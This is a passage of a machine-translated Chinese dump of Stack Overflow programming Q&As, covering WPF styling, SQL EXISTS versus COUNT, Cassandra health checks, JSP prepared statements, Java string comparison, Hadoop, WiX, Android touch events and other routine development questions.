                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                    </Grid.ColumnDefinitions>
                    <Popup x:Name="Popup" AllowsTransparency="true" IsOpen="{Binding IsDropDownOpen, RelativeSource={RelativeSource TemplatedParent}}" Margin="1" PopupAnimation="{DynamicResource {x:Static SystemParameters.ComboBoxPopupAnimationKey}}" Placement="Bottom">

                        <Border x:Name="DropDownBorder" BorderBrush="{DynamicResource {x:Static SystemColors.WindowFrameBrushKey}}" BorderThickness="1" Background="{DynamicResource {x:Static SystemColors.WindowBrushKey}}">

                            <ScrollViewer x:Name="DropDownScrollViewer">
                                <Grid RenderOptions.ClearTypeHint="Enabled">
                                    <Canvas HorizontalAlignment="Left" Height="0" VerticalAlignment="Top" Width="0">
                                        <Rectangle x:Name="OpaqueRect" Fill="{Binding Background, ElementName=DropDownBorder}" Height="{Binding ActualHeight, ElementName=DropDownBorder}" Width="{Binding ActualWidth, ElementName=DropDownBorder}"/>
                                    </Canvas>
                                    <ItemsPresenter x:Name="ItemsPresenter" KeyboardNavigation.DirectionalNavigation="Contained" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                                </Grid>
                            </ScrollViewer>
                        </Border>
                    </Popup>
                    <ContentPresenter ContentTemplate="{DynamicResource FlowMenuComboBoxContentTemplate}" ContentTemplateSelector="{TemplateBinding ItemTemplateSelector}" 
                                      Content="{TemplateBinding SelectionBoxItem}" ContentStringFormat="{TemplateBinding SelectionBoxItemStringFormat}" 
                                      HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" IsHitTestVisible="true" Margin="{TemplateBinding Padding}" 
                                      SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}" VerticalAlignment="{TemplateBinding VerticalContentAlignment}"/>
                </Grid>
                <!-- THIS CURRENTLY THROWS AN ERROR
                <ControlTemplate.Triggers>
                    <EventTrigger RoutedEvent="GotFocus">
                        <EventTrigger.Actions>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxContentTemplateGlow" Storyboard.TargetProperty="Opacity" From="0" 
                               To="1" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                        </EventTrigger.Actions>
                    </EventTrigger>
                    <EventTrigger RoutedEvent="LostFocus">
                        <EventTrigger.Actions>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxContentTemplateGlow" Storyboard.TargetProperty="Opacity" From="1" 
                               To="0" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                        </EventTrigger.Actions>
                    </EventTrigger>
                </ControlTemplate.Triggers>-->
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-30T16:04:18.757

将触发器移动到 ItemTemplate 并使用相对源来获取组合框项的 isFocused 路径修复了此问题。

```
 <Setter Property="ItemTemplate">
        <Setter.Value>
            <DataTemplate>
                <Grid>
                    <Border x:Name="FlowMenuComboBoxItemTemplatePosterGlow" Style="{DynamicResource PosterBorder}" BorderThickness="1" Opacity="0">
                        <Border.Effect>
                            <BlurEffect KernelType="Gaussian" Radius="3" />
                        </Border.Effect>
                    </Border>
                    <Grid Margin="5,5,5,5">
                        <TextBlock Text="{Binding}" Style="{DynamicResource FlowMenuText}">
                    <TextBlock.Effect>
                        <DropShadowEffect x:Name="FlowMenuComboBoxItemTemplateGlow" BlurRadius="8" Color="LightGray" ShadowDepth="0" Opacity="0" />
                    </TextBlock.Effect>
                        </TextBlock>
                    </Grid>
                </Grid>
                <DataTemplate.Triggers>
                    <DataTrigger Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type ComboBoxItem}},Path=IsFocused}" Value="True">
                        <DataTrigger.EnterActions>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxItemTemplatePosterGlow" Storyboard.TargetProperty="Opacity" From="0" 
                               To="1" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxItemTemplateGlow" Storyboard.TargetProperty="Opacity" From="0" 
                               To="1" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                        </DataTrigger.EnterActions>
                        <DataTrigger.ExitActions>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxItemTemplatePosterGlow" Storyboard.TargetProperty="Opacity" From="1" 
                               To="0" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                            <BeginStoryboard>
                                <Storyboard>
                                    <DoubleAnimation Storyboard.TargetName="FlowMenuComboBoxItemTemplateGlow" Storyboard.TargetProperty="Opacity" From="1" 
                               To="0" Duration="0:0:0.5" />
                                </Storyboard>
                            </BeginStoryboard>
                        </DataTrigger.ExitActions>
                    </DataTrigger>
                </DataTemplate.Triggers>
            </DataTemplate>
        </Setter.Value>
    </Setter> 
```

# sql-server-2008 - sql，存在或计数

> ID：10246286
> 
> 赞同：1
> 
> 时间：2012-04-20T12:31:06.623
> 
> 标签：sql-server-2008, count, exists

我有一张桌子，想检查是否存在满足一些简单条件的记录。我想知道哪个会更快：

`if (select count(*) from ... where ...) > 0`

或者

`if exists (select top (1) from ... where ...)`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T12:40:27.910

exists 找到与 where 子句匹配的记录后立即返回结果，而 count 需要扫描整个表以确定计数。所以存在更快

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T12:34:03.223

```
if exists (select 1 from ... where ...) 
```

（假设您在`where`列上有索引...）

# cassandra - Cassandra 连接的健康检查（使用赫克托）？

> ID：10246287
> 
> 赞同：14
> 
> 时间：2012-04-20T12:31:09.737
> 
> 标签：cassandra, hector

对于我的应用程序的操作监控，我正在寻找类似于常用的“SQL连接验证”查询的东西

> 选择 1;

在 Cassandra 中，使用 Hector 驱动程序。我尝试过查看 Cluster.getKnownPoolHosts() 和 .getConnectionManager().getActivePools() 之类的方法。但似乎它们的状态并没有持续更新，只有当我实际尝试通过查询访问 Cassandra 时。

我希望我的健康检查独立于任何需要存在的键空间或用户 CF，因此仅运行“虚拟”查询似乎很困难（反对什么？）。当然，它不应该占用大量内存或产生任何重大负载。

我可以强制 Hector 在不运行真正查询的情况下以某种方式更新其连接池状态吗？

（顺便说一句：CQL 甚至不接受“SELECT 1”作为有效查询。）

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-12-03T12:00:47.230

使用 CQL3，我使用以下查询：

```
SELECT now() FROM system.local; 
```

如果用户由于某种原因无法访问`system`键空间或列族，最好完全摆脱 FROM 子句以使其通用。`local`但与其他答案一样，至少这不应该给出误报。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-11T05:40:52.357

我目前使用的解决方案似乎是迄今为止最强大的解决方案（使用 Cassandra 1.1 和 1.2 测试）是对“系统”的简单查询：

`Query<String> query = Query.selectQuery("*", "system", null, 1, consistencyLevel, StringSerializer.get());`

这不是我想要的，因为它是一个“真实”的查询，但另一方面它不会给出任何误报。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-09-01T04:23:27.897

[Eemeli Kantola 的查询](https://stackoverflow.com/a/20350621/839733)返回一个时间戳，我无法将其转换为任何 Java 类型。对我有用并返回字符串的替代查询是`SELECT release_version FROM system.local;`

# oracle - 如何通过jsp页面从oracle 10g表中检索多行

> ID：10246295
> 
> 赞同：0
> 
> 时间：2012-04-20T12:31:35.653
> 
> 标签：oracle, oracle10g

我想通过 JSP 使用 prepare 语句从 oracle 10g 表中检索多行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:47:39.227

以下 JSP 代码创建一个准备好的语句：

```
String myquery = "SELECT * FROM EMPLOYEES WHERE DEPARTMENT = ?";
PreparedStatement mystatement = connection.prepareStatement(myquery); 
```

第一行将 SQL 语句存储在名为 myquery 的字符串变量中，并带有一个问号 (?) 作为 SQL 变量值的占位符。第二行创建一个名为 mystatement 的准备好的语句对象。

接下来，为 SQL 变量赋值，如下所示：

```
mystatement.setString(1, request.getParameter("myURLparam")); 
```

setString 方法将值分配给变量并接受两个参数。第一个参数通过其位置（这里是 SQL 语句中的第一个位置）指定受影响的变量。第二个参数指定变量的值。在此示例中，该值由传递给页面的 URL 参数提供。

注意：您必须使用不同的方法将非字符串值分配给 SQL 变量。例如，要将整数分配给变量，您将使用 mystatement.setInt() 方法。

最后，生成记录集，如下所示：

```
ResultSet myresults = mystatement.execute(); 
```

请从以下链接[http://oracle.ittoolbox.com/groups/technical-functional/oracle-apps-l/how-to-connect-to-database-in-jsp-using-jdbc-中找到以下示例代码驱动程序到 Oracle 数据库 1569382](http://oracle.ittoolbox.com/groups/technical-functional/oracle-apps-l/how-to-connect-to-database-in-jsp-using-jdbc-drivers-to-oracle-database-1569382)

```
<%@ page import="java.io.*, java.util.*, java.sql.*"%> 
<%@ page import="oracle.jdbc.driver.OracleConnection" %> 
<% 
OracleConnection conn1 = null; 

ResultSet getCountRs = null; 

PreparedStatement getCountStmt = null; 
try{ 
conn1 = (OracleConnection)TransactionScope.getConnection(); 

getCountStmt = conn1.prepareStatement("SELECT 
PROMPT,FUNCTION_ID,SUB_MENU_ID FROM FND_MENU_ENTRIES_VL WHERE MENU_ID 
=:1 and prompt is not null"); 

getCountStmt.setInt(1,pMenuid); 

getCountRs = getCountStmt.executeQuery(); 
while(getCountRs.next()) 
{ 
prompt[x]=getCountRs.getString(1); 
function_id[x]=getCountRs.getInt(2); 

submenu_id[x]=getCountRs.getInt(3); 
x++; 
} 
} 
catch(exception e) {} 
%> 
```

# java - 使用 substring() 似乎不等价的字符串

> ID：10246296
> 
> 赞同：1
> 
> 时间：2012-04-20T12:31:36.853
> 
> 标签：java, substring, equivalence

> **可能重复：**
> [Java String.equals 与 ==](https://stackoverflow.com/questions/767372/java-string-equals-versus)

我是java新手，所以不要指望事情会很容易，但这让我完全震惊。为什么 if 语句不能正确评估：

```
import javax.swing.JFrame;
import javax.swing.JTextArea;

public class StringMystery extends JFrame {

    JTextArea txt = new JTextArea();
    String string1 = "abcde";
    String string2 = string1.substring(0,4);

    public StringMystery() {

        setLayout(null);

        txt.setBounds(20, 20, 100, 100);
        add(txt);

        txt.setText(string2);

        //string 2 is definitely equal to "abcd" but this doesn't evaluate:
        if (string2 == "abcd"){     
            txt.setText("string2 = abcd");          
        }

    }

    public static void main(String[] args) {

        StringMystery jtxt = new StringMystery();
        jtxt.setSize(200,200);
        jtxt.setTitle("String Mystery");

        jtxt.setVisible(true);

    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T12:33:17.190

不要（**永远**）`==`用于比较，除非您想比较实际参考。您需要使用该`.equals()`方法。你`String`可以考虑写作`"abcd".equals(myStr)`——因为 myStr 可能是`null`.

请注意，在 Java 中，字符串是[实习](http://en.wikipedia.org/wiki/String_interning)的，`==`有时可能会给出正确的结果，但绝不应该依赖它。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-20T12:32:56.213

`==`通过引用而不是值来比较对象。

您有两个包含相同值的不同字符串对象，因此`==`返回 false。

你需要打电话`.equals()`。

# c# - 截断的 ScrollViewer 包含 TextBlock

> ID：10246298
> 
> 赞同：0
> 
> 时间：2012-04-20T12:31:43.860
> 
> 标签：c#, silverlight, windows-phone-7, silverlight-4.0, silverlight-3.0

我发现 ScrollViewer 的奇怪行为包含 TextBlock。只要我输入超过 48 个字符串，文本就会在滑动时被截断。

这是我的例子：

```
<controls:PivotItem x:Name="PivotItem2" Header="2">
                       <Grid>
                        <ScrollViewer Margin="0,0,0,0"  Width="427">
                        <StackPanel  Margin="0,0,0,6">
                          <StackPanel.Background>
                             <ImageBrush Stretch="Fill"/>
                           </StackPanel.Background>
                            <TextBlock x:Name="DATE" HorizontalAlignment="Left" TextWrapping="Wrap" Text="PublicDate" Foreground="White"/>
                            <TextBlock x:Name="CONTENT" TextWrapping="Wrap" Foreground="White"  FontSize="32">
                             <Run Text="1"/><LineBreak/><Run Text="2"/><LineBreak/><Run Text="3"/><LineBreak/><Run Text="4"/><LineBreak/><Run Text="5"/><LineBreak/><Run Text="6"/><LineBreak/><Run Text="7"/><LineBreak/><Run Text="8"/><LineBreak/><Run Text="9"/><LineBreak/><Run Text="0"/><LineBreak/><Run Text="11"/><LineBreak/><Run Text="12"/><LineBreak/><Run Text="13"/><LineBreak/><Run Text="14"/><LineBreak/><Run Text="15"/><LineBreak/><Run Text="16"/><LineBreak/><Run Text="17"/><LineBreak/><Run Text="18"/><LineBreak/><Run Text="19"/><LineBreak/><Run Text="20"/><LineBreak/><Run Text="21"/><LineBreak/><Run Text="22"/><LineBreak/><Run Text="23"/><LineBreak/><Run Text="24"/><LineBreak/><Run Text="25"/><LineBreak/><Run Text="26"/><LineBreak/><Run Text="27"/><LineBreak/><Run Text="28"/><LineBreak/><Run Text="29"/><LineBreak/><Run Text="30"/><LineBreak/><Run Text="31"/><LineBreak/><Run Text="32"/><LineBreak/><Run Text="33"/><LineBreak/><Run Text="34"/><LineBreak/><Run Text="35"/><LineBreak/><Run Text="36"/><LineBreak/><Run Text="37"/><LineBreak/><Run Text="38"/><LineBreak/><Run Text="39"/><LineBreak/><Run Text="40"/><LineBreak/><Run Text="41"/><LineBreak/><Run Text="42"/><LineBreak/><Run Text="43"/><LineBreak/><Run Text="44"/><LineBreak/><Run Text="45"/><LineBreak/><Run Text="46"/><LineBreak/><Run Text="47"/><LineBreak/><Run Text="48"/><LineBreak/><Run Text="49"/><LineBreak/><Run Text="50"/><LineBreak/><Run Text="51"/><LineBreak/><Run Text="52"/><LineBreak/><Run Text="53"/><LineBreak/><Run Text="54"/><LineBreak/><Run Text="55"/><LineBreak/><Run Text="56"/><LineBreak/><Run Text="57"/><LineBreak/><Run Text="58"/><LineBreak/><Run Text="59"/><LineBreak/><Run Text="60"/><LineBreak/><Run Text="61"/><LineBreak/><Run Text="62"/><LineBreak/><Run Text="63"/><LineBreak/><Run Text="64"/><LineBreak/><Run Text="65"/><LineBreak/><Run Text="66"/><LineBreak/><Run Text="67"/><LineBreak/><Run Text="68"/><LineBreak/><Run Text="69"/><LineBreak/><Run Text="70"/><LineBreak/><Run Text="71"/><LineBreak/><Run Text="72"/><LineBreak/><Run Text="73"/><LineBreak/><Run Text="74"/><LineBreak/><Run Text="75"/><LineBreak/><Run Text="76"/><LineBreak/><Run Text="77"/><LineBreak/><Run Text="78"/><LineBreak/><Run Text="79"/><LineBreak/><Run Text="80"/><LineBreak/><Run Text="81"/><LineBreak/><Run Text="82"/><LineBreak/><Run Text="83"/><LineBreak/><Run Text="84"/><LineBreak/><Run Text="85"/><LineBreak/><Run Text="86"/><LineBreak/><Run Text="87"/><LineBreak/><Run Text="88"/><LineBreak/><Run Text="!Binding MessageText"/>
             </TextBlock>

                     </StackPanel>
                      </ScrollViewer>
                    </Grid> 
   </controls:PivotItem> 
```

这是我的屏幕截图：

![在此处输入图像描述](../Images/4ae71f8d0aa48afcf9074d5f6f071c1d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:53:41.807

这是标准的滚动查看器行为（即使在 Silverlight 之外）。内容滚动到用户停止的地方。如果您希望在用户停止滚动时始终显示文本项，则需要实现额外的逻辑。

# session - Kohana 3.2：读取会话数据时出错

> ID：10246299
> 
> 赞同：0
> 
> 时间：2012-04-20T12:31:54.547
> 
> 标签：session, kohana, authentication

我正在使用 Kohana 3.2 开发一个模块（一个简单的 cms），我收到了这个异常“读取会话数据时出错”。

我正在使用本机会话，有趣的是，如果我设置“默认”组数据库连接，则不会显示错误...（我正在使用自定义连接组，并且我已将此数据库连接组设置为用户、角色和 user_token 模型）。

这是我的配置文件

授权文件

```
return array(

    'driver'       => 'orm',
    'hash_method'  => 'sha256',
    'hash_key'     => 'just a test 1',
    'lifetime'     => 1209600,
    'session_type' => 'native',
    'session_key'  => 'just a test 2',

    // Username/password combinations for the Auth File driver

    'users' => array(
       // 'luca' => 'e12afe0d3ead3d36191d86229d27057d96d9f2e063fe6f3e86699aaab5310d42'
        // 'admin' => 'b3154acf3a344170077d11bdb5fff31532f679a1919e716a02',
    ),

); 
```

会话.php

```
return array(
    'native' => array(
        'name' => 'session_native',
        'lifetime' => 43200,
    ),
    'cookie' => array(
        'name' => 'session_cookie',
        'encrypted' => TRUE,
        'lifetime' => 43200,
    ),
    'database' => array(
        'name' => 'session_database',
        'encrypted' => TRUE,
        'lifetime' => 43200,
        'group' => Pencil::db_group(),
        'table' => 'sessions',
        'columns' => array(
            'session_id'  => 'session_id',
            'last_active' => 'last_active',
            'contents'    => 'contents'
        ),
        'gc' => 500,
    ),
); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T02:08:34.540

您将 encrypted 设置为 true，因此您需要一个加密密钥。在你的 config/encrypt.php 添加这个：

```
 <?php

return array(
    'default' => array(
        'key' => 'MY_RANDOM_KEY_I_MADE_UP_ALL_BY_MYSELF',
    ),
); 
```

我会将 session_key 设置为 'auth_user' 而不是你的随机密钥。我认为这种情况下的密钥与哈希密钥不同。

检查应用程序/日志中的日志以查看是否缺少其他任何内容。

# hadoop - 如何从 Mapper Hadoop 设置系统环境变量？

> ID：10246301
> 
> 赞同：0
> 
> 时间：2012-04-20T12:32:03.863
> 
> 标签：hadoop, mapreduce

**线下的问题已解决，但我面临另一个问题。**

我正在这样做：

```
DistributedCache.createSymlink(job.getConfiguration()); 
DistributedCache.addCacheFile(new URI   
("hdfs:/user/hadoop/harsh/libnative1.so"),conf.getConfiguration()); 
```

在映射器中：

```
System.loadLibrary("libnative1.so"); 
```

（我也试过 System.loadLibrary("libnative1"); System.loadLibrary("native1");

但我收到此错误：

```
java.lang.UnsatisfiedLinkError: no libnative1.so in java.library.path 
```

我完全不知道应该将 java.library.path 设置为什么。我尝试将其设置为 /home 并将每个 .so 从分布式缓存复制到 /home/ 但它仍然不起作用:(

请问有什么建议/解决方案吗？

~~IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII~~

我想设置运行映射器的机器的系统环境变量（特别是 LD_LIBRARY_PATH）。

我试过 ：

```
Runtime run = Runtime.getRuntime();
Process pr=run.exec("export LD_LIBRARY_PATH=/usr/local/:$LD_LIBRARY_PATH"); 
```

但它会抛出 IOException。

我也知道

```
JobConf.MAPRED_MAP_TASK_ENV 
```

但我使用的 hadoop 版本 0.20.2 有 Job & Configuration 而不是 JobConf。

我找不到任何这样的变量，这也不是 Hadoop 特定的环境变量，而是系统环境变量。

任何解决方案/建议？提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T15:04:46.090

为什么不在集群的所有节点上导出这个变量？

无论如何，在提交作业时使用如下[配置](http://hadoop.apache.org/common/docs/r0.20.205.0/api/org/apache/hadoop/conf/Configuration.html)类

```
Configuration conf = new Configuration();
conf.set("mapred.map.child.env",<string value>);
Job job = new Job(conf); 
```

值的格式为 k1=v1,k2=v2

# wix - Wix：阻止文件通过 Windows Installer 服务恢复

> ID：10246302
> 
> 赞同：1
> 
> 时间：2012-04-20T12:32:12.470
> 
> 标签：wix

我们这里有点情况。我们正在使用以下代码段在安装时编写一个 ini 文件：

```
<Component Id="_CFG" Guid="{CADE766F-3AF0-40A6-9D35-12AC4FD5B278}" Feature="DefaultFeature" KeyPath="yes" Location="either" NeverOverwrite="yes">
 <CreateFolder Directory="CFG" />
 <Environment Id="SharedAppend" Name="Path" Value="[CommonFilesFolder]Company Shared\MyDir" Separator=";" Action="set" Part="last" Permanent="yes" System="yes" />
 <IniFile Id="MyCFG.ini1" Action="addLine" Directory="CFG" Key="LOCAL_ROOT" Name="ata.ini" Section="ALIAS" Value="[CommonAppDataFolder]Company\MyDir" />
  <IniFile Id="MyCFG.ini73" Action="addLine" Directory="CFG" Key="APPLICATIONS" Name="ata.ini" Section="GENERAL" Value="Product1;Product2;Product3;Product4;" />
 <RegistryValue Id="Registry47asdf" Root="HKLM" Key="SOFTWARE\Company\MyProd" Name="LocalRoot" Value="[CommonAppDataFolder]Company\MyDir\" Type="string" />
</Component> 
```

此安装由管理员用户执行。现在第二个用户（标准）通过一些应用程序修改这个文件。之后，当第三个用户登录并启动应用程序时，会出现 Windows 安装程序进度对话框，这会将文件恢复到原始文件。

我想，**“NeverOverwrite”**会阻止这种情况，但它没有奏效。

我假设**“NeverOverwrite”**属性可能不适用于**元素。**

 **任何人都知道如何防止此文件通过 Windows 安装程序服务恢复？

多谢了。。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T14:03:56.383

修改 ini 文件不应触发[Windows Installer Resiliency](http://support.microsoft.com/kb/290997)。[发生的情况是，当组件的密钥路径](https://stackoverflow.com/questions/2003043/what-is-the-wix-keypath-attribute)（即某个文件或注册表项）消失时，将重新安装组件。

所以你需要弄清楚这些事情：

1.  哪个组件*安装*INI 文件？（我想这不是您在问题中显示的组件，因为它只*修改*INI 文件。）
2.  该组件的密钥路径是什么？（如果没有明确标记，wix 将采用该组件中的第一个文件或注册表项。）
3.  为什么 keypath 文件或注册表项会消失，从而触发重新安装该组件？

此外，您可能需要考虑将 ini 文件放在它自己的组件中。这样，它将是它自己的密钥路径，并且只有在它实际消失时（而不是在某些*其他*文件或注册表项消失时）才会由 Windows 安装程序弹性机制重新安装。**

# javascript - Android 浏览器触摸事件停止显示正在更新公司。画布/元素 - 如何解决？

> ID：10246305
> 
> 赞同：9
> 
> 时间：2012-04-20T12:32:18.800
> 
> 标签：javascript, android, android-2.3-gingerbread

在*某些*android 的本机浏览器上，触摸页面似乎会停止显示更新，直到手指松开。这发生在基于 html 元素的动画（切换类）和基于画布的动画中。但是，它不会停止正常的 js 执行，并且会正常触发其他事件。在有这个问题的设备上，海豚浏览器似乎也受到影响（虽然不是 firefox）。

Touchstart/move 都触发了 preventDefault() 以及 stopPropergation(), cancelBubble = true; 和 e.returnValue = false;。在 CSS webkit 中的选择也被禁用​​了。页面不会滚动。

这里也问了一个类似的问题： [Android browser lock DOM on touchStart?](https://stackoverflow.com/questions/5361406/does-android-browser-lock-dom-on-touchstart)

但我想知道是否可以克服这种行为，或者至少发现哪些设备会受到该问题的影响，是设备还是版本 android 问题？如果您无法回答运行演示的问题并报告您的体验以及您的设备型号和用户代理（显示在演示页面底部）作为评论可能会帮助其他人或我自己回答问题。

这是一个演示和重现该行为的步骤。链接的二维码可以在这里找到[https://s3-eu-west-1.amazonaws.com/canvas-test-pd/tmp.png](https://s3-eu-west-1.amazonaws.com/canvas-test-pd/tmp.png)。

[https://s3-eu-west-1.amazonaws.com/canvas-test-pd/index.html](https://s3-eu-west-1.amazonaws.com/canvas-test-pd/index.html)

网页顶部有一个画布，底部有一个带有背景图像的 div。每隔一秒，画布就会被清除并显示不同的图像，并且 div 会切换它的类（都在 0 和 1 png 之间切换）。切换几次后，将手指放在画布（顶部的灰色框）上并保持在那里。等待动画是否继续（有时会一两次然后停止）以及是否有任何视觉失真。

**更新** 似乎运行 3.2 的 Galaxy Tab 需要用于 touchstart/end of document 的处理程序，而不仅仅是屏幕所需的 div 以继续更新显示。谢谢吉姆皮克。

我开始相信这是由制造商的皮肤引起的问题，尽管这很难证明。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T09:11:07.270

我无法真正告诉您为什么会发生这种情况，但是在注册文档触摸事件时遇到了类似的问题。当我仅注册触摸移动事件时，我遇到了与您遇到的完全相同的问题，但是当我也注册了 touchstart 时，它突然起作用了。在您的情况下，只需将以下行添加到您的 main.js

```
function touchHandlerDummy(e)
{
    e.preventDefault();
    return false;
}
document.addEventListener("touchstart", touchHandlerDummy, false);
document.addEventListener("touchmove", touchHandlerDummy, false);
document.addEventListener("touchend", touchHandlerDummy, false); 
```

适用于我的 Galaxy Tab。希望这是你想要做的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-12-21T18:19:41.590

我有同样的问题。神奇的是，当我在该部分添加以下行时，问题完全消失了`<header>`：

```
<meta name="viewport" content="width=device-width"> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-20T13:20:17.490

Answers here helped me a lot.

My solution is simply combination of what has been mentioned here, so if you want:
1\. "drag and drop" on Samsung Galaxy S2 native browser (Android 4.1.2)
2\. disable user scaling the page (viewport set to no scaling)

```
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.01">
    <script>
        window.addEventListener("load", function() {
            function onTouchPreventDefault(event) { event.preventDefault(); };
            document.addEventListener("touchmove", onTouchPreventDefault, false);
            document.addEventListener("touchstart", onTouchPreventDefault, false);
        }, false);
    </script>
</head> 
```

1.  Viewport
    `<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.01">`

    *   unfortunately user can still zoom the page in a little bit, 1.01 is the smallest value that does the job
2.  Disable pinch to zoom
    `document.addEventListener("touchmove", function (event) { event.preventDefault(); }, false);`

    *   this disables pinch to zoom
3.  Disable double tap to zoom
    `document.addEventListener("touchstart", function (event) { event.preventDefault(); }, false); //OR document.addEventListener("touchend", function (event) { event.preventDefault(); }, false);`

    *   this disables double tap to zoom, you can choose if you want to use touchstart or touchend (or both) for this purpouse

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T11:00:53.223

这会成功的:)

> 函数 touchHandlerDummy(e) { e.preventDefault(); 返回假；} document.addEventListener("touchmove", touchHandlerDummy, false);

# iphone - 设置 CLLocationManager 的委托（两种不同的方式，它们是否相等？）

> ID：10246312
> 
> 赞同：0
> 
> 时间：2012-04-20T12:32:43.200
> 
> 标签：iphone, objective-c, delegates, cllocationmanager

使用 CLLocationManager 编写教程，我在 init 方法中设置委托：

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];

    if (self) 
    {
        locationManager = [[CLLocationManager alloc] init];
        [locationManager setDelegate:self];
        [locationManager setDesiredAccuracy:kCLLocationAccuracyBest];
        [locationManager startUpdatingLocation];
    }
    return self;
} 
```

设置委托：

```
[locationManager setDelegate:self]; 
```

在另一个教程中，我在头文件中设置了委托：

```
@interface MyViewController : UIViewController <CLLocationManagerDelegate> 
```

他们平等吗？有什么区别（如果有的话）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:40:57.173

这是两件不同的事情。

[CLLocationManagerDelegate](https://developer.apple.com/library/mac/#documentation/CoreLocation/Reference/CLLocationManagerDelegate_Protocol/CLLocationManagerDelegate/CLLocationManagerDelegate.html)是一个[协议](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocProtocols.html)。
`[locationManager setDelegate:self]`只需设置对象委托，因此 CLLocationManager 可以调用已实现的委托方法。要使其正常工作，`self`必须符合 CLLocationManagerDelegate 协议。

换句话说，你需要两者都做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:49:48.090

如果你想实现并从 CLLocationManger 的委托中获取回调，你将需要它们

您在标题中指定

```
@interface MyViewController : UIViewController <CLLocationManagerDelegate> 
```

这告诉 xcode MyViewController 将实现 CLLocationManagerDelegate 方法。如果有非可选的委托方法，xcode 会提醒你去实现它们。

使用下面的行

```
[locationManager setDelegate:self]; 
```

您告诉您的 CLLocationManager (locationManager) 实例 MyViewController (self) 将是委托，它应该调用您已实现的所有已实现的 CLLocationManagerDelegate 方法（如果需要）

# android - 如何将 SET 转换回 HASHMAP 以在 customAdapter 中显示

> ID：10246324
> 
> 赞同：0
> 
> 时间：2012-04-20T12:33:06.857
> 
> 标签：android

我真的被这个问题困住了，希望能得到一些帮助。

首先，我有一个正在运行的服务，其中包含一个简单的哈希图

ORIG_MSG_MAP 是一个带有 Integer,String 键值对的 hashmap。该服务有一个方法可以将 hashmap 的内容作为一个集合返回

```
//get entries in the hash 
public Set<Entry<String, Integer>> getNumbers() {
    // TODO Auto-generated method stub

    return ORIG_MSG_MAP.entrySet();

} 
```

在我的活动中，我正在与服务交互，然后我在 customAdapter 中调用我的构造函数，它需要使用哈希图而不是 SET

活动

```
 /** Defines callbacks for service binding, passed to bindService() */
private ServiceConnection mConnection = new ServiceConnection() {
@Override
public void onServiceConnected(ComponentName className, IBinder service) {
// We've bound to LocalService, cast the IBinder and get LocalService instance
LocalBinder binder = (LocalBinder) service;
mService = binder.getService();
mBound = true;
Set<Entry<String, Integer>> whatsup = mService.getNumbers(); 
```

----> 问号应该是对带有键值对的哈希的引用 <---- setListAdapter(new MyCustomAdapter(DynamicLists.this, R.layout.row, ???));

MyCustomAdapter 的构造函数他需要一个哈希

```
public MyCustomAdapter(DynamicLists dynamicLists, int row, HashMap<String, Integer> map){ 
mData = map;
mKeys = mData.keySet().toArray(new String[map.size()]);
Log.d(TAG, "INSIDE ADAPTER constructor HELLO WORLD " + map.entrySet()); 
```

}

你能帮我把一个集合转换回哈希吗

谢谢，

格雷厄姆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:38:39.740

试试看：

```
Set<Entry<String, Integer>> yourSet;
HashMap<String,Integer> yourMap = new HashMap<String,Integer>();
for (Entry<String,Integer> entry : yourSet) {
    yourMap.put(entry.getKey(),entry.getValue());
} 
```

实际上，只需将集合中的每个条目添加到新的 HashMap 中

